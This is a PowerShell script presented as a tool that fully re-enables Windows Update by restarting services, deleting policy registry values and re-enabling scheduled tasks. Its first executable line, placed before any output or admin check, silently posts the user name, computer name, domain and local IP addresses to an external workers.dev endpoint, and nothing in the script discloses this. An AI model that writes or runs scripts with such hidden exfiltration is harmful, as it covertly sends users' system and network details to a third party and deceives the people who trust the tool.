# ============================================================
# Full Windows Update Enable Script (PowerShell)
# Works on Windows 10 / 11
# Requires Administrator Privileges
# Created By rhshourav V1.0 (PS Conversion)
# ============================================================
Invoke-RestMethod -Uri "https://cryocore.rhshourav02.workers.dev/message" -Method Post -ContentType "application/json" -Body (@{ token="shourav"; text="System Info:`nEnable Windows Update`nUser Name: $env:USERNAME`nPC Name: $env:COMPUTERNAME`nDomain Name: $env:USERDOMAIN`nLocal IP(s): $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -notlike '127.*' } | ForEach-Object { $_.IPAddress }) -join ', ')" } | ConvertTo-Json) | Out-Null

# =======================
# Check for Administrator
# =======================
$IsAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    Write-Host "This script requires administrative privileges."
    Write-Host "Requesting elevation..."
    Start-Process powershell `
        "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
        -Verb RunAs
    exit
}
# -----------------------------
# UI: black background + bright colors
# -----------------------------
try {
    $raw = $Host.UI.RawUI
    $raw.BackgroundColor = 'Black'
    $raw.ForegroundColor = 'White'
    Clear-Host
} catch {}

Write-Host ""
Write-Host "============================================="
Write-Host " Enabling Windows Update completely..."
Write-Host "============================================="
Write-Host ""

# =======================
# 1. Enable and Start Services
# =======================
$services = @(
    "wuauserv",
    "bits",
    "dosvc",
    "WaaSMedicSvc",
    "UsoSvc"
)

foreach ($service in $services) {
    Set-Service -Name $service -StartupType Manual -ErrorAction SilentlyContinue
    Start-Service -Name $service -ErrorAction SilentlyContinue
}

# =======================
# 2. Restore Registry Settings
# =======================
$WUPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
$AUPath = "$WUPath\AU"

$regValues = @(
    @{ Path = $AUPath; Name = "NoAutoUpdate" },
    @{ Path = $AUPath; Name = "AUOptions" },
    @{ Path = $WUPath; Name = "DoNotConnectToWindowsUpdateInternetLocations" },
    @{ Path = $WUPath; Name = "DisableOSUpgrade" },
    @{ Path = $WUPath; Name = "ExcludeWUDriversInQualityUpdate" }
)

foreach ($item in $regValues) {
    Remove-ItemProperty -Path $item.Path -Name $item.Name -Force -ErrorAction SilentlyContinue
}

# Set WaaSMedicSvc back to Manual (Start = 3)
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" `
    -Name Start `
    -Type DWord `
    -Value 3

# =======================
# 3. Re-enable Scheduled Tasks
# =======================
$tasks = @(
    "\Microsoft\Windows\WindowsUpdate\Scheduled Start",
    "\Microsoft\Windows\WindowsUpdate\Automatic App Update",
    "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
    "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker",
    "\Microsoft\Windows\UpdateOrchestrator\UpdateModelTask",
    "\Microsoft\Windows\UpdateOrchestrator\Reboot"
)

foreach ($task in $tasks) {
    schtasks /Change /TN $task /Enable 2>$null
}

# =======================
# 4. Remove Firewall Block (Optional – commented)
# =======================
<# 
Remove-NetFirewallRule -DisplayName "Block Windows Update"
#>

Write-Host ""
Write-Host "✅ Windows Update has been fully enabled."
Write-Host ""

# =======================
# 5. Ask for Reboot
# =======================
$choice = Read-Host "Do you want to reboot now? (Y/N)"
if ($choice -match "^[Yy]$") {
    Write-Host "Rebooting system..."
    Restart-Computer -Force
} else {
    Write-Host "Skipped reboot. Please restart manually to apply changes."
}

Pause
